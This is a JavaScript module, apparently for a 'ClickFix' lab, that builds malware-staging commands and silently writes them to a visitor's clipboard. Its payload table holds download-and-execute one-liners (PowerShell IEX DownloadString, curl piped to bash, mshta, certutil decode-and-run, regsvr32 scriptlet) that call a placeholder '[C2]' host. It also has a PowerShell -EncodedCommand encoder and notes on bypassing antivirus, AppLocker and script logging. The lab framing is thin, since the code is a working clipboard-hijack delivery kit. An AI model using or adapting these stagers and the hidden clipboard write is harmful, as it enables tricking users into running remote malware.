/* ClickFix Lab — standalone JS module
   Mirrors the inline <script> in clickfix-lab.html.
   All payloads are lab-harmless; [C2] is a placeholder. */

const PAYLOADS = {
  'ps-iex': {
    name: 'PowerShell IEX', mitre: 'T1059.001', lolbin: 'powershell.exe',
    evasion: 'Execution policy bypass, fileless staging',
    win: `powershell -NoProfile -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://[C2]/stage.ps1')"`,
    mac: `curl -fsSL http://[C2]/stage.sh | bash`,
    winOnly: false,
  },
  'ps-encoded': {
    name: 'PS EncodedCommand', mitre: 'T1027', lolbin: 'powershell.exe',
    evasion: '-EncodedCommand bypasses string-match AV; UTF-16LE b64',
    win: null, mac: null, winOnly: false,
  },
  'mshta': {
    name: 'MSHTA HTA', mitre: 'T1218.005', lolbin: 'mshta.exe',
    evasion: 'Trusted MS binary; bypasses AppLocker / Script Block Logging',
    win: `mshta http://[C2]/verify.hta`, mac: null, winOnly: true,
  },
  'certutil': {
    name: 'CertUtil Stager', mitre: 'T1105', lolbin: 'certutil.exe',
    evasion: 'File fetch + base64 decode via built-in PKI binary',
    win: `certutil -urlcache -split -f http://[C2]/s.b64 %TEMP%\\s.b64 & certutil -decode %TEMP%\\s.b64 %TEMP%\\s.bat & %TEMP%\\s.bat`,
    mac: null, winOnly: true,
  },
  'regsvr32': {
    name: 'Regsvr32 Scriptlet', mitre: 'T1218.010', lolbin: 'regsvr32.exe',
    evasion: 'COM scriptlet; bypasses AppLocker; no PowerShell required',
    win: `regsvr32 /s /n /u /i:http://[C2]/payload.sct scrobj.dll`,
    mac: null, winOnly: true,
  },
};

/* UTF-16LE base64 required by PowerShell -EncodedCommand */
function psb64(cmd) {
  const buf = new Uint8Array(cmd.length * 2);
  for (let i = 0; i < cmd.length; i++) {
    buf[i * 2]     = cmd.charCodeAt(i) & 0xff;
    buf[i * 2 + 1] = (cmd.charCodeAt(i) >> 8) & 0xff;
  }
  return btoa(String.fromCharCode(...buf));
}

function getPayload(cfg) {
  const def = PAYLOADS[cfg.payload];
  if (cfg.payload === 'ps-encoded') {
    const inner = `IEX(New-Object Net.WebClient).DownloadString('http://[C2]/stage.ps1')`;
    if (cfg.os === 'windows')
      return `powershell -NoProfile -WindowStyle Hidden -EncodedCommand ${psb64(inner)}`;
    return `echo ${btoa(inner)} | base64 -d | bash`;
  }
  if (cfg.os === 'macos' && def.mac) return def.mac;
  return def.win || `# Windows-only: use curl stager on macOS`;
}

function writeClipboard(text) {
  try {
    if (navigator.clipboard && navigator.clipboard.writeText)
      return navigator.clipboard.writeText(text);
  } catch (_) {}
  const ta = document.createElement('textarea');
  ta.value = text;
  ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:0;left:0;width:1px;height:1px';
  document.body.appendChild(ta);
  ta.focus(); ta.select();
  try { document.execCommand('copy'); } catch (_) {}
  document.body.removeChild(ta);
  return Promise.resolve();
}

export { PAYLOADS, psb64, getPayload, writeClipboard };
